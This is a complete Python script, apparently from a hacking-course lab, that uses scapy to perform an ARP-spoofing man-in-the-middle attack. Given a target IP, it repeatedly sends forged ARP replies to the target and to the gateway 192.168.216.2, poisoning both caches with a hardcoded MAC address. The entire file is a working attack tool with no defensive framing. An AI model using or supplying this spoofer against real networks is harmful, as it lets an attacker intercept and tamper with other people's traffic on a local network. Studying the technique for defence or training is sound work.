#!/usr/bin/env python3 

import argparse 
import scapy.all as scapy
import sys 
import signal
import time

# MITM ATTACK 

def ctrl_c(sig,frame):
    print("\n[!] Exiting...")
    sys.exit(1)

signal.signal(signal.SIGINT,ctrl_c)

def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofer o envenenador ARP")
    parser.add_argument('-t', '--target', required=True,help="HOST / IP range to spoof", dest="ip_address")
    return parser.parse_args().ip_address

def spoof(ip_address_dest, ip_address_spoof):
    arp_packet = scapy.ARP(op=2, pdst=ip_address_dest, psrc=ip_address_spoof, hwsrc="00:0c:29:85:8e:61") 
    scapy.send(arp_packet, verbose=False) 

def main():
    ip_address_dest = get_arguments()
    while True:
        spoof(ip_address_dest, '192.168.216.2')
        spoof('192.168.216.2', ip_address_dest) 


if __name__ == "__main__":
    main()
